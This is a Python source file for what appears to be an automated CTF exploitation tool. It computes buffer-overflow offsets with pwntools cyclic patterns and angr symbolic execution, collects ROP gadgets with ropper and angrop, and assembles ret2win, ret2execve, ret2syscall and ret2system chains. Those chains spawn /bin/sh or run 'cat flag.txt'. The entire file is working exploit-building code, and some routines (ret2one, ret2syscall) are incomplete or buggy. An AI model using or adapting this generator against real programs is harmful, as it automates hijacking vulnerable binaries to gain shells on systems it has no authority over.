from pwn import *
import angr
import angrop
import claripy
import subprocess
import os
from Print import Print

class ROP:
    def __init__(self, analysis):
        self.analysis = analysis
        self.filename = analysis.binary
        self.offset = self.set_offset()
        self.e = ELF(self.filename)
        self.gadgets = []
        self.find_gadgets()
        self.libc = "/opt/libc.so.6"
        # angrop stuff
        self.angr_proj = angr.Project(self.analysis.binary)
        self.angr_rop  = self.angr_proj.analyses.ROP()
        self.angr_rop.find_gadgets_single_threaded() 
        #self.angr_rop.find_gadgets()
        self.fart_print = Print()

    def write_binsh_to_mem(self):
        self.analysis.hbsh = True
        return self.angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
    
    # TODO: genralize to account for syscall or execve
    #def ropwrite(self, dumb=False):
    #    chain = b'A'*self.offset
    #    chain += self.write_binsh_to_mem()
    #    chain += self.fill_reg("rdi", self.get_writeable_mem())
    #    if dumb:
    #        chain += self.realign()
    #    chain += p64(self.analysis.elf.sym['system'])
    #    return chain
    
    def build_exploit(self, failed=False):
        payload = None
        if self.analysis.has_win():
            if self.analysis.win_has_args():
                if self.analysis.has_execve():
                    payload = self.ret2execve(failed)
                elif self.analysis.has_syscall():
                    payload = self.ret2syscall(failed)
                elif self.analysis.has_system():
                    payload = self.ret2system(failed)
                else:
                    payload = self.ret2win_with_args(failed)
            else:
                payload = self.ret2win(failed)
        elif self.analysis.has_execve():
            payload = self.ret2execve(failed)
        elif self.analysis.has_system():
            payload = self.ret2system(failed)
        elif self.analysis.has_syscall():
            payload = self.ret2syscall(failed)
        elif self.analysis.has_leak_string():
            payload = self.ret2one(failed)
        else:
            self.fart_print.warning("Exploit not found!")
        
        return payload
    
    def set_offset(self):
        try:
            p = process(self.filename)
            p.sendline(cyclic(1024, n=8))
            p.wait()
            core = p.corefile
            p.close()
            os.remove(core.file.name)
            return cyclic_find(core.read(core.rsp, 8), n=8)
        except PwnlibException as e:
            return Get2overflow(self.filename).buf()

    def ret2win(self, failed):
        payload = cyclic(self.offset)
        if failed:
            payload += self.realign()
        payload += p64(self.e.sym["win"])
        
        return payload
    
    def ret2win_with_args(self, failed):
        #TODO: Instead of passing address to win, return address to system or execve inside of win to avoid argument
        payload = cyclic(self.offset)
        payload += self.satisfy_win()
        if failed:
            payload += self.realign()
        payload += p64(self.e.sym['win'])

        return payload

    def ret2execve(self, failed):
        payload = cyclic(self.offset)
        payload += self.generic_first_arg()
        payload += self.fill_reg("rsi", 0)
        payload += self.fill_reg("rdx", 0)
        if failed:
            payload += self.realign()
        payload += p64(self.e.sym["execve"])

        return payload

    def ret2syscall(self, failed):
        payload = cyclic(self.offset)
        payload += self.fill_reg("rax", 59)
        payload += self.generic_first_arg()
        payload += self.fill_reg("rsi", 0)
        payload += self.fill_reg("rdx", 0)
        if failed:
            self.realign()
        payload += p64(self.get_syscall())
        
        return payload
    
    def ret2system(self, failed):
        payload = cyclic(self.offset)
        payload += self.generic_first_arg() 
        payload += self.fill_reg("rsi", 0)
        if failed:
            payload += self.realign()
        payload += p64(self.e.sym['system'])
        
        return payload

    def ret2one(self, failed):
        payload = cyclic(self.offset)
        p = process(self.filename)
        p.recvuntil(b": ")
        leak = p.recvline().decode('utf-8').strip()
        p.close()

        return payload

    def generic_first_arg(self):
        payload = b""

        if self.analysis.has_catflagtxt():
            payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
        elif self.analysis.has_binsh():
            payload += self.fill_reg("rdi", self.analysis.get_binsh())
        else:
            payload += self.write_binsh_to_mem()
            payload += self.fill_reg("rdi", self.get_writeable_mem())
        
        return payload

    def find_gadgets(self):
        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | grep 0x"
        raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
            self.gadgets.append(i.replace(" nop;", ""))

    def get_pops(self):
        pops = []
        for i in self.gadgets:
            pops.append(i) if "pop" in i else next
        return pops

    def num_pops(self, string):
        return string.count('pop')

    def reg_pos(self, reg, gad):
        out = []
        gad = gad.split(' ')
        registers = ['rax',
                     'rbx',
                     'rcx',
                     'rdx',
                     'rsi',
                     'rdi',
                     'rbp',
                     'rsp',
                     'r8',
                     'r9',
                     'r10',
                     'r11',
                     'r12',
                     'r13',
                     'r14',
                     'r15']
        for i in gad:
            if i.strip(';') in registers:
                out.append(i.strip(';'))
        return out.index(reg)
    
    def pop_reg(self, reg):
        for i in self.get_pops():
            if ': pop ' + reg + "; ret;" in i:
                return [i.split(":")[0], 1, self.reg_pos(reg, i)]
            elif "pop " + reg in i:
                return [i.split(":")[0], self.num_pops(i), self.reg_pos(reg, i)]

    def fill_reg(self, reg, val):
        if isinstance(val, int):
            val = p64(int(val))
        elif isinstance(val, str):
            val = val.encode('utf-8')

        chain = p64(int(self.pop_reg(reg)[0], 16))
        for i in range(self.pop_reg(reg)[1]):
            if i == (self.pop_reg(reg)[2]):
                chain += val
            else:
                chain += p64(0)
        return chain

    def get_syscall(self):
        for i in self.gadgets:
            if "syscall" in i:
                return int(i.split(":")[0], 16)
        return None
   
    def get_system(self):
        for i in self.gadgets:
            if "system" in i:
                return int(i.split(":")[0], 16)
        return None

    def realign(self):
        return p64(self.analysis.get_fini())

    def satisfy_win(self):
        return self.fill_reg("rdi", int(self.analysis.get_win_arg(), 16))
    
    def get_primitives_str(self):
        for i in self.gadgets:
            if 'qword ptr [' in i and 'mov' in i:
                return i
        return None
    def get_primitives(self):
        return p64(int(self.get_primitives_str().split(':')[0],16))

    # 0th is write_mem, 1st is other adddr
    def get_primitive_regs(self):
        prim = self.get_primitives_str().split('mov qword ptr')[1].split(';')[0][2:].split(',')
        return [prim[0][:2], prim[1]]
    def get_writeable_mem(self):
        return self.analysis.elf.sym['__data_start']
    
    # writes /bin/sh into memory
    def write_binsh(self):
        ret = b''
        ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
        ret += self.fill_reg(self.get_primitive_regs()[1].strip(' '), '/bin/sh\0')
        ret += self.get_primitives()
        return ret
            
    def one_gadget(self):
          return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', self.libc]).decode().split(' ')]

class Get2overflow:
    def __init__(self, binary):
        self.fart_print = Print()
        self.elf = context.binary =  ELF(binary)
        self.proj = angr.Project(binary)
        start_addr = self.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 1024
        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
        self.symbolic_padding = None

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes["mem_corrupt"] = []

        self.simgr.explore(step_func=self.check_mem_corruption)

    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"AAAAAAAA")
                        self.symbolic_padding = stack_smash[:index]
                        simgr.stashes["mem_corrupt"].append(path)
                    except ValueError:
                        self.fart_print.error("Failed to get offset!")
                else:
                    self.fart_print.error("[-] Not satisfiable")
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    def buf(self):
        return len(self.symbolic_padding)

